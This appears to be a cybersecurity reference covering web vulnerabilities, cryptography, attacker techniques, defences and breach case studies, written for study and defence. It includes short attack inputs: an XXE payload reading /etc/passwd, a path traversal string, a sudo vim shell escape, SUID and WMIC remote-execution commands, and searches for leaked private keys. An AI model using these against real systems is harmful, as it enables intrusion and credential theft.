OAuth 2.0 is an authorization framework commonly misimplemented in ways that lead to account takeover. Common vulnerabilities: Missing state parameter (the state param prevents CSRF during OAuth flows — without it, attackers can craft OAuth initiation URLs that link victim accounts to attacker accounts); Open redirect in redirect_uri (if redirect_uri is not strictly validated, tokens can be redirected to attacker-controlled endpoints); PKCE bypass (Proof Key for Code Exchange prevents code interception for public clients — missing PKCE allows code injection attacks); Token leakage via Referer header (implicit flow puts access tokens in URL fragments, which leak in Referer headers); Scope escalation (requesting overly broad permissions). Defense: always validate the state parameter; strictly allowlist redirect_uri values (exact match, no pattern matching); use Authorization Code flow with PKCE for all clients; prefer short-lived access tokens with refresh token rotation; audit all OAuth scopes granted to third-party applications.

Cryptographic weaknesses allow attackers to break confidentiality, integrity, or authentication guarantees. MD5 (128-bit): fully broken — chosen-prefix collisions can be generated in seconds (Flame malware forged a Microsoft code-signing certificate using MD5 collisions). SHA-1 (160-bit): broken — SHAttered attack demonstrated practical chosen-prefix collisions in 2017; still used in legacy TLS certificates. RC4: stream cipher with known biases — forbidden in TLS since RFC 7465. DES (56-bit): brute-forceable in hours. Current standards: use SHA-256 or SHA-3 for hashing; AES-256-GCM for symmetric encryption; RSA-4096 or ECDSA P-256 for asymmetric; Argon2id for password hashing (with tuned memory, iteration, and parallelism parameters to resist GPU cracking); avoid ECB mode (reveals data patterns — the 'ECB penguin'). Post-quantum cryptography (PQC): NIST has standardized CRYSTALS-Kyber (key exchange) and CRYSTALS-Dilithium (signatures) for quantum-resistance as quantum computers threaten RSA and ECC.

Side-channel attacks extract secrets by measuring physical or operational properties of a system rather than attacking the algorithm directly. Timing attacks exploit variable execution time — e.g., a string comparison that returns early on the first mismatch leaks the correct character one-by-one (use constant-time comparison functions like crypto.timingSafeEqual in Node.js). Power analysis attacks (Simple/Differential Power Analysis) measure power consumption of cryptographic hardware to extract keys — relevant for smart cards and embedded systems. Cache-timing attacks (Flush+Reload, Prime+Probe) exploit CPU cache behavior to infer secret memory access patterns. Spectre and Meltdown (2018) exploited CPU speculative execution to read arbitrary kernel and cross-process memory — required OS and microcode patches affecting performance. DRAM Rowhammer bit-flipping allows memory corruption by repeatedly accessing adjacent memory rows. Defenses: constant-time implementations; hardware with side-channel protections; OS-level mitigations (KPTI, IBRS, STIBP); process isolation.

Supply chain attacks compromise software, hardware, or services before they reach the target organization. Attack vectors: compromising build pipelines (SolarWinds SUNBURST); typosquatting malicious packages in npm, PyPI, or RubyGems with names similar to popular packages (e.g., 'colo-rs' vs 'colors'); dependency confusion (publishing a public package with the same name as an internal private package — package managers may prefer the public malicious version); compromising open-source maintainer accounts and injecting malicious code (XZ Utils backdoor, 2024 — nearly compromised SSH on Linux). Defense: pin dependency versions and verify checksums; use a Software Bill of Materials (SBOM) in CycloneDX or SPDX format to inventory all components; implement dependency review in CI/CD (Dependabot, Snyk, Socket.dev); use private package registries with allowlisting; sign build artifacts with Sigstore; enforce code review for dependency updates; audit new maintainer additions in critical open-source projects.

Zero Trust Architecture (ZTA) rejects the traditional 'trust but verify' perimeter model (once inside the network, everything is trusted). Zero Trust assumes breach — no implicit trust is granted based on network location, device, or user. Principles: verify every access request explicitly (authenticate and authorize every request using identity, device health, location, and behavior); use least-privilege access (JIT, JEA — Just Enough Access); assume breach (segment networks, monitor everything, minimize blast radius). Implementation pillars: strong identity (MFA, FIDO2, continuous authentication); device health verification (endpoint compliance, EDR health, certificate-based device auth); microsegmentation (network policies at the workload level, not just perimeter); encrypted communications everywhere (mTLS for service-to-service); continuous monitoring and anomaly detection. NIST SP 800-207 defines the ZTA framework. ZTNA (Zero Trust Network Access) solutions replace VPNs, providing per-application, identity-aware access without placing users on the corporate network.

Security Information and Event Management (SIEM) systems aggregate, correlate, and analyze security logs from across the environment to detect threats. Key data sources: firewall logs, DNS logs, Active Directory events (4624 logon, 4625 failed logon, 4740 lockout, 4728 group membership changes), EDR telemetry, web proxy, email gateway, cloud provider logs (AWS CloudTrail, Azure Monitor). Correlation rules detect known attack patterns (e.g., multiple failed logins followed by success = brute force; large data transfers after hours = potential exfiltration). UEBA (User and Entity Behavior Analytics) uses machine learning to baseline normal behavior and alert on deviations (impossible travel, access to unusual resources). Popular platforms: Splunk, Microsoft Sentinel, Elastic SIEM, Chronicle. SOC (Security Operations Center) analysts triage SIEM alerts, investigate incidents, and hunt for threats. Challenge: high false positive rates exhaust analysts — tune rules, use SOAR (Security Orchestration, Automation and Response) to automate Tier 1 triage.

Threat modeling is a structured process to identify, quantify, and address security risks in a system during design — when fixing issues is cheapest. STRIDE methodology (Microsoft): Spoofing identity, Tampering with data, Repudiation (denying actions), Information disclosure, Denial of service, Elevation of privilege — each threat maps to a security property to protect. Process: 1) Define the system scope (draw data flow diagrams showing components, data flows, and trust boundaries); 2) Enumerate threats using STRIDE per component; 3) Rate threats by likelihood and impact (DREAD or CVSS-style scoring); 4) Define mitigations; 5) Validate during code review and pentest. PASTA (Process for Attack Simulation and Threat Analysis) is a risk-centric alternative focused on business objectives. The MITRE ATT&CK framework maps known adversary techniques to detection and mitigation strategies. Threat modeling should be a living document — update with every architecture change.

XML External Entity (XXE) injection exploits XML parsers that process external entity declarations in Document Type Definitions (DTDs). An attacker submits crafted XML containing an external entity definition pointing to a sensitive resource: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>. When the parser resolves the entity, it reads /etc/passwd and includes it in the response — enabling arbitrary file read, internal network port scanning, and SSRF. Blind XXE exfiltrates data via out-of-band channels (DNS lookups or HTTP to an attacker-controlled server) when the response doesn't reflect the data. XXE can lead to RCE in specific configurations (e.g., via PHP expect:// wrapper or Java ProcessBuilder via jar:// URI). Defense: disable external entity processing in the XML parser (the default in many modern parsers, but must be explicitly configured — e.g., FEATURE_EXTERNAL_GENERAL_ENTITIES=false in Java); use JSON instead of XML where possible; use allowlist-based input validation; deploy WAF rules for XXE payloads.

Insecure Direct Object Reference (IDOR) occurs when an application uses user-controllable input (like an ID in a URL or request body) to directly reference internal objects without verifying the requesting user's authorization to access that specific object. Example: GET /api/invoices/1042 — changing 1042 to 1043 retrieves another user's invoice. IDOR is the most common critical vulnerability found in bug bounty programs and consistently ranks as OWASP A01 (Broken Access Control). Variants: horizontal privilege escalation (user A accesses user B's resources); vertical privilege escalation (regular user accesses admin functions); IDOR in indirect references (guessable filenames in S3, sequential order IDs). Defense: implement server-side authorization checks on every object access (verify the authenticated user owns/has permission to access the requested resource); use cryptographically random UUIDs instead of sequential IDs to reduce guessability (security by obscurity — must be combined with proper auth checks); conduct authorization testing as a core part of security reviews.

Path traversal (directory traversal) allows attackers to read arbitrary files on the server by manipulating file path inputs with ../ sequences to escape the intended directory. Example: a web app serving files via ?file=report.pdf — an attacker submits ?file=../../../../etc/passwd. Local File Inclusion (LFI) goes further — in PHP, including user-supplied file paths (?page=about) can include system files or log files containing attacker-injected PHP code (log poisoning — write PHP code into Apache logs via User-Agent, then include the log file). Remote File Inclusion (RFI) includes files from remote URLs — requires allow_url_include=On (disabled by default in modern PHP). Defense: never use user input directly in file path operations; use a whitelist of allowed files/directories; resolve absolute paths and verify they start with the intended base directory (realpath() validation); use chroot jails or containers to limit file system access; disable allow_url_include and allow_url_fopen in PHP configurations.

Insecure deserialization occurs when applications deserialize data from untrusted sources without validation, allowing attackers to manipulate serialized objects to achieve Remote Code Execution (RCE), authentication bypass, or privilege escalation. Java is particularly vulnerable — the Java serialization format is processed by ObjectInputStream which triggers class constructors and methods during deserialization. Gadget chains (pre-existing code paths in libraries like Apache Commons Collections, Spring, Hibernate) can be chained to achieve arbitrary code execution without writing new code — ysoserial is the standard tool for generating Java deserialization payloads. PHP object injection exploits the magic method __wakeup() or __destruct() called during deserialization. Python's pickle module executes arbitrary code — never unpickle untrusted data. Defense: avoid deserializing untrusted data; use safe data formats (JSON, Protocol Buffers) instead of native serialization; if serialization is needed, implement cryptographic integrity checks (HMAC) before deserializing; use deserialization firewalls (Java Agent to block dangerous classes — e.g., NotSoSerial); keep libraries updated to patched versions.

Privilege escalation (privesc) elevates an attacker from a low-privilege foothold to a higher-privilege context (local admin, root, or SYSTEM). Linux privesc vectors: sudo misconfiguration (sudo -l lists allowed commands — running sudo vim allows shell escape via :!bash); SUID/SGID binaries (setuid programs that run as root regardless of who executes them — search with find / -perm -4000 2>/dev/null; GTFOBins documents exploitable binaries); writable /etc/passwd (adding a root-level user); cron jobs running writable scripts as root; kernel exploits (Dirty COW, PwnKit/CVE-2021-4034 in polkit affecting virtually all Linux distributions); weak file permissions on sensitive files. Windows privesc: unquoted service paths; AlwaysInstallElevated registry key; token impersonation (PrintSpoofer, RoguePotato — abusing Windows privilege tokens); UAC bypass techniques; vulnerable services running as SYSTEM. Use automated tools like LinPEAS/WinPEAS for enumeration during pentests.

Lateral movement is the phase where an attacker pivots from an initial foothold to additional systems within the target network. Techniques from the MITRE ATT&CK framework: Pass-the-Hash and Pass-the-Ticket (using stolen credentials/Kerberos tickets to authenticate to other hosts); PsExec (creates a remote service to execute commands — generates Event ID 7045); WMI (Windows Management Instrumentation — wmic /node:target process call create 'cmd.exe' — stealthy, no service creation); PowerShell Remoting (invoke-command -computername target); Remote Desktop Protocol (RDP — attackers use stolen credentials; look for Event ID 4624 Type 10 logons); SMB shares (enumerate and access shared resources, deploy payloads); DCSync (mimicking a domain controller to pull all password hashes from AD — requires Replicating Directory Changes permissions). Detection: baseline normal network connections between hosts; alert on admin tool usage from unexpected sources; monitor for new service creation (7045), remote process creation, and unusual Kerberos ticket requests.

Command and Control (C2) infrastructure enables attackers to remotely control compromised systems after initial access. C2 channels must evade detection by blending with legitimate traffic. Common C2 frameworks used by red teams and attackers: Cobalt Strike (most commonly detected in real breaches — uses customizable HTTP/HTTPS beacons with malleable C2 profiles to mimic legitimate software traffic); Metasploit (Meterpreter); Brute Ratel C4; Sliver; Havoc. Covert C2 channels: DNS tunneling (encodes C2 data in DNS queries — hard to block since DNS is essential; detect via high volume of DNS queries, long subdomain labels, or low-TTL records); HTTPS to trusted cloud services (SharePoint, OneDrive, Slack, GitHub — domain fronting routes traffic through CDNs); ICMP tunneling; steganography in image files. Detection: implement DNS monitoring for beaconing patterns; monitor outbound connections for regular-interval beaconing (e.g., every 60 seconds ± jitter); inspect TLS traffic with SSL inspection; use threat intelligence feeds for known C2 IPs and domains; deploy network detection tools (Zeek, Suricata, NDR solutions).

The OWASP Top 10 (2021) represents the most critical web application security risks: A01 Broken Access Control (unauthorized access to functions/data — IDOR, privilege escalation, CORS misconfiguration); A02 Cryptographic Failures (weak algorithms, unencrypted data at rest/transit, hardcoded keys, MD5 password hashing); A03 Injection (SQL, NoSQL, OS, LDAP injection — any interpreter receiving hostile data from untrusted sources); A04 Insecure Design (missing security controls in architecture — threat modeling identifies these); A05 Security Misconfiguration (default credentials, verbose error messages, open cloud storage, unnecessary features enabled); A06 Vulnerable and Outdated Components (Log4Shell, Struts RCE — scan dependencies with SCA tools); A07 Identification and Authentication Failures (credential stuffing, missing MFA, weak session management); A08 Software and Data Integrity Failures (insecure deserialization, CI/CD pipeline attacks, unsigned updates); A09 Security Logging and Monitoring Failures (no audit logs, no alerting — attackers operate undetected); A10 Server-Side Request Forgery (SSRF — server fetches attacker-controlled URLs accessing internal resources).

MITRE ATT&CK (Adversarial Tactics, Techniques & Common Knowledge) is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It organizes attacker behavior into 14 tactical categories (columns): Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command & Control, Exfiltration, and Impact. Each category contains specific techniques (e.g., T1566 Phishing, T1055 Process Injection, T1003 OS Credential Dumping) and sub-techniques. Use cases: threat intelligence (map known APT TTPs); red team planning (simulate realistic attack chains); detection engineering (map detection rules to ATT&CK techniques to identify coverage gaps); SOC maturity assessment (ATT&CK Navigator visualizes coverage). ATT&CK for ICS covers industrial control system attacks. ATT&CK for Mobile covers Android/iOS threats. The D3FEND framework provides the complementary defensive knowledge base.

Credential-based attacks exploit weak or reused passwords. Brute force: exhaustively tries all password combinations — rate limiting and account lockout policies mitigate this. Password spraying: tries a small number of common passwords (Password1!, Summer2024) against a large number of accounts to avoid lockout triggers — highly effective against organizations with no MFA. Credential stuffing: uses credential pairs (username:password) from data breaches (e.g., the RockYou2021 list containing 8.4 billion entries) and automates login attempts across multiple services exploiting password reuse — tools: Sentry MBA, OpenBullet. Account takeover (ATO) is the goal — access to email accounts is particularly damaging (email is the master key for password reset on most services). Defenses: mandatory MFA eliminates credential stuffing (the correct password alone is insufficient); bot detection on login endpoints (CAPTCHA, behavioral analysis, device fingerprinting); breach password checks (HIBP Passwords API integration, NIST SP 800-63B recommends checking against breach lists); impossible travel and new-device alerts.

Threat Intelligence (TI) is evidence-based knowledge about existing or emerging threats that helps organizations make informed security decisions. Indicator of Compromise (IoC) types: IP addresses (C2 servers), domain names, file hashes (SHA-256 of malware samples), URLs, email addresses, TTP signatures (YARA rules, Sigma rules). TI levels: Strategic (executive-level — geopolitical threat landscape, industry targeting trends); Operational (campaign-level — specific adversary group TTPs, targeting, infrastructure); Tactical (IoC-level — IP blocklists, hash lists for automated blocking). Sharing standards: STIX (Structured Threat Information eXpression — JSON-based TI format); TAXII (Trusted Automated eXchange of Intelligence Information — transport protocol for STIX). Sources: commercial TI platforms (Recorded Future, CrowdStrike Intelligence, Mandiant); open source (MISP, AlienVault OTX, VirusTotal, Abuse.ch); ISACs (Information Sharing and Analysis Centers — industry-specific sharing communities). TI-driven threat hunting proactively searches for adversary TTPs before alerts fire.

Network segmentation divides a network into isolated zones with controlled traffic flows between them, limiting the blast radius of a breach — a compromised workstation should not be able to directly reach a database server or domain controller. Traditional segmentation: VLANs (Layer 2) with inter-VLAN routing controlled by firewall rules; DMZ (demilitarized zone) for internet-facing services isolated from the internal network. Modern approaches: microsegmentation enforces security policies at the individual workload level (Illumio, VMware NSX, Guardicore) — independent of network topology; Software-Defined Networking (SDN) enables dynamic policy enforcement. Tiered architecture for Active Directory: Tier 0 (Domain Controllers — accessible only from Tier 0 admin workstations); Tier 1 (Servers); Tier 2 (Workstations) — prevent lateral movement from lower to higher tiers. Defense in depth (layered security): assume each layer will be breached; design so breach of one layer does not immediately compromise all assets.

Digital forensics preserves, acquires, and analyzes digital evidence for incident investigation or legal proceedings. Evidence volatility order (collect most volatile first): CPU registers and cache; running processes and open network connections; RAM; swap/pagefile; disk; removable media; logs. Memory forensics with Volatility Framework: analyze RAM dumps to recover running processes (pslist, pstree), network connections (netscan), injected code (malfind), encryption keys, credentials, and command history — critical for detecting fileless malware that lives only in memory. Disk forensics: acquire forensic images (dd, FTK Imager, dc3dd) before analysis — always work on copies, never originals; calculate and document hash values (SHA-256) for chain of custody; analyze file system metadata, deleted files, browser history, prefetch files, registry hives, event logs, and $MFT. Anti-forensics techniques: log wiping (Windows Event Log manipulation — timestomp for timestamp modification); disk wiping; encryption; steganography. Timeline analysis correlates events across data sources.

DevSecOps integrates security into every phase of the Software Development Lifecycle (SDLC) — 'shifting left' by finding vulnerabilities early when they cost orders of magnitude less to fix. Security activities by phase: Requirements (threat modeling, security user stories); Design (architecture review, security patterns); Code (secure coding training, IDE security plugins, peer code review with security checklist); Build (SAST — Static Application Security Testing with tools like Semgrep, SonarQube, Checkmarx analyzes source code for vulnerabilities without executing); Test (DAST — Dynamic Application Security Testing with OWASP ZAP, Burp Suite Pro scans running applications; IAST — Interactive AST instruments the app during testing; fuzz testing); Deploy (IaC security scanning — Checkov, tfsec for Terraform; secrets scanning — GitGuardian, truffleHog — prevents committing API keys/credentials); Monitor (runtime security, application logging, RASP — Runtime Application Self-Protection). Treat security findings like bugs in your issue tracker with defined SLAs by severity.

Clickjacking (UI redressing) tricks users into clicking on invisible or disguised elements by overlaying a transparent malicious iframe over a legitimate page. Example: attacker overlays a transparent iframe of a banking site's 'Transfer Funds' button over a 'Click here for a prize' button — the user thinks they're clicking the prize button but actually confirms the bank transfer. Sophisticated variants: cursor jacking (displaying a fake cursor offset from the real cursor position); multi-step clickjacking (multiple clicks required for a complete action, like disabling account security). Defenses: X-Frame-Options HTTP header — DENY (block all framing) or SAMEORIGIN (allow only same-origin framing); Content-Security-Policy frame-ancestors directive (more flexible, preferred over X-Frame-Options — e.g., frame-ancestors 'self'); frame-busting JavaScript (fragile, bypassable via sandbox attribute — not recommended as primary defense). Most modern browsers enforce these headers, making clickjacking significantly harder.

Open Source Intelligence (OSINT) involves gathering information from publicly available sources to build a target profile before active exploitation — no interaction with target systems. Sources: WHOIS (domain registration data — owner, registrar, name servers); DNS enumeration (subdomains via DNSrecon, Amass, certificate transparency logs — crt.sh); Shodan/Censys (search engines for internet-connected devices — find exposed services, default credentials, software versions); Google Dorking (advanced search operators — site:target.com filetype:pdf, intitle:'Index of' /admin, 'login' site:target.com ext:asp); LinkedIn/social media (employee names, technologies used, org structure — enables spear phishing); GitHub (leaked credentials, API keys, internal IP ranges, architecture details — search for org:company 'password' or 'BEGIN RSA PRIVATE KEY'); breach databases (Have I Been Pwned, DeHashed — compromised employee credentials); Wayback Machine (historical website content, exposed config files). OSINT frameworks: Maltego (visual relationship mapping), SpiderFoot, TheHarvester, Recon-ng.

System hardening reduces the attack surface by eliminating unnecessary features, services, and configurations that attackers could exploit. CIS Benchmarks (Center for Internet Security) provide prescriptive hardening guides for OS (Windows, Linux, macOS), cloud providers (AWS, Azure, GCP), browsers, and applications — with Levels 1 (low disruption) and 2 (high security). Key Linux hardening: disable unused services (systemctl disable <service>); remove unnecessary packages; configure firewall (iptables/nftables) with default deny; enable SELinux or AppArmor; configure sshd (disable root login, disable password auth in favor of key-based, change default port, enable AllowUsers); enable auditd for security event logging; set secure file permissions; configure kernel sysctl parameters (disable IP forwarding unless routing, enable SYN cookies). Windows hardening: enable Windows Defender, disable SMBv1, restrict PowerShell execution policy, enable PowerShell ScriptBlock logging, enable LSASS protection, configure Windows Firewall, apply STIG or CIS GPOs. Use automated tools: OpenSCAP, Lynis (Linux), or Microsoft Security Compliance Toolkit.

Industrial Control System (ICS/OT) security protects critical infrastructure — power grids, water treatment, manufacturing, oil and gas — from cyber threats. Unique challenges: legacy systems with 20-30 year lifespans designed before cybersecurity was considered; availability over confidentiality (a patch reboot on a power plant controller is not acceptable); proprietary protocols (Modbus, DNP3, PROFINET, IEC 61850 not designed with authentication); direct physical-world consequences of compromise (safety hazards, environmental damage). Stuxnet (2010): the first known weaponized cyber-physical attack — destroyed Iranian uranium enrichment centrifuges by subtly altering Siemens PLC commands while reporting normal operation to operators. Purdue Model/ICS Reference Architecture: segmented zones (Enterprise, DMZ, Control, Field Device) — strict one-way data flows (using data diodes) between zones. OT-specific security: asset inventory with passive monitoring (Claroty, Dragos, Nozomi — avoid active scanning that crashes PLCs); NERC CIP standards for electric utility security; anomaly detection for industrial protocols; incident response planning that accounts for physical safety.

Honeypots are decoy systems designed to attract and detect attackers while providing intelligence on their techniques. Types: Low-interaction (simulate services — cowrie for SSH, Dionaea for malware collection, OpenCanary); High-interaction (full operating systems configured to appear valuable — longer attacker dwell time for intelligence gathering, but riskier to contain); Honeynets (networks of honeypots for broader visibility). Honeytokens are embedded decoy credentials, URLs, or documents that trigger alerts when accessed — tools like Canarytokens.org create free tokens (a URL that alerts when clicked, a Word document that beacons when opened, fake AWS credentials that alert when used). Benefits: zero false positives (any interaction with a honeypot/honeytoken is suspicious); early detection of lateral movement (an attacker who reaches a honeyserver was not stopped at the perimeter); intelligence gathering on attacker TTPs, tools, and objectives. Legal considerations: honeypots may entrap users — ensure they are clearly segregated from production and consult legal counsel on jurisdiction-specific rules.

Secure coding practices prevent vulnerabilities from being introduced during development. Core principles: Never trust user input — validate, sanitize, and encode all input from any external source (users, APIs, files, environment variables); Use parameterized queries (prepared statements) exclusively for database interactions — never concatenate strings into SQL; Output encoding matches the context (HTML entity encoding for HTML, JavaScript encoding for JS contexts, URL encoding for URL parameters); Use allowlists (define what IS allowed) rather than denylists (defining what is NOT allowed — attackers find bypasses); Fail securely — errors should default to denying access and log without revealing sensitive details to users; Keep security controls server-side — client-side controls (JavaScript validation) are advisory only and trivially bypassed; Use memory-safe languages and frameworks where possible; Avoid eval(), exec(), and dynamic code execution with user input; Store secrets in environment variables or secret managers — never hardcode API keys, database passwords, or cryptographic keys in source code; Regular dependency updates; Security-focused code review checklists (OWASP Code Review Guide).

Storing passwords securely requires hashing with purpose-built slow algorithms — not fast hashing functions (MD5, SHA-256) which GPUs can compute at billions/sec. Modern password hashing: Argon2id (winner of the Password Hashing Competition — parameterized by memory, iterations, and parallelism; resists GPU and ASIC attacks; recommended by NIST SP 800-63B and OWASP for new systems); bcrypt (battle-tested, work factor-based, maximum 72-character input); PBKDF2 (FIPS-approved, used in WPA2 and iOS keychain). Critical requirements: always use a cryptographically random salt (unique per password, stored alongside the hash) to prevent rainbow table attacks (precomputed hash-to-password tables) and ensure identical passwords produce different hashes; use sufficient work factors (Argon2id: 19MB memory, 2 iterations minimum; bcrypt: cost factor 12+ in 2024); never use MD5, SHA-1, or unsalted SHA-256 for password storage. If a database of bcrypt hashes is stolen, cracking is computationally infeasible at scale. Pepper (server-side secret mixed into the hash) provides additional protection if only the database is compromised.

Log4Shell (CVE-2021-44228) demonstrated the catastrophic potential of library vulnerabilities in ubiquitous dependencies. Within 24 hours of disclosure in December 2021, attackers were actively exploiting it to deploy Mirai botnet malware, cryptocurrency miners, Cobalt Strike beacons, and ransomware. The vulnerability's trivial exploitation (any logged string field) and massive attack surface (Log4j was embedded in tens of thousands of products including enterprise software, gaming servers, cloud services, and IoT devices) made it one of the most severe vulnerabilities ever discovered. The incident exposed critical weaknesses in software supply chain visibility — many organizations didn't know they used Log4j until they had to search for it. Response: Patch to Log4j 2.17.1+; use Software Bill of Materials (SBOM) for dependency awareness; implement network egress controls to block outbound JNDI/LDAP traffic from application servers; deploy WAF rules; monitor for exploitation indicators (JNDI strings in logs).

The Colonial Pipeline ransomware attack (May 2021) by the DarkSide criminal group caused the largest publicly known attack on US critical infrastructure. Colonial Pipeline supplies ~45% of the East Coast's fuel. The attackers gained initial access via a compromised VPN account with no MFA enabled and a reused password found in a breached credential list. After stealing 100GB of data, DarkSide deployed ransomware encrypting the billing system. Colonial proactively shut down operational technology (OT) pipeline systems as a precaution, causing fuel shortages across the East Coast, panic buying, and a declaration of a state of emergency in 17 states. Colonial paid a $4.4M ransom in Bitcoin (the DOJ subsequently recovered $2.3M). DarkSide operated as Ransomware-as-a-Service. Lessons: MFA on all remote access is non-negotiable; segment IT and OT networks; maintain offline backups; have a tested IR plan that includes OT systems; pre-negotiate cyber insurance covering ransomware events.

The XZ Utils backdoor (CVE-2024-3094, March 2024) was a sophisticated multi-year supply chain attack targeting SSH authentication on Linux systems. The attacker ('Jia Tan') spent approximately 2 years contributing legitimate fixes to the XZ Utils compression library — a critical dependency of systemd and therefore OpenSSH on many Linux distributions — building trust and maintainer access. The injected backdoor in versions 5.6.0 and 5.6.1 used complex obfuscation (disguised within test binary files, triggered only under specific build conditions including glibc and systemd linkage) to plant a backdoor in liblzma, which modified the RSA_public_decrypt function in OpenSSH to allow authentication bypass using a hardcoded private key — effectively a global SSH backdoor on affected systems. Discovered by Microsoft engineer Andres Freund by noticing SSH login latency. Caught before reaching stable distributions. Lessons: the open-source trust model is vulnerable to long-term social engineering; automated build integrity verification and reproducible builds are essential; monitor for mysterious performance regressions.
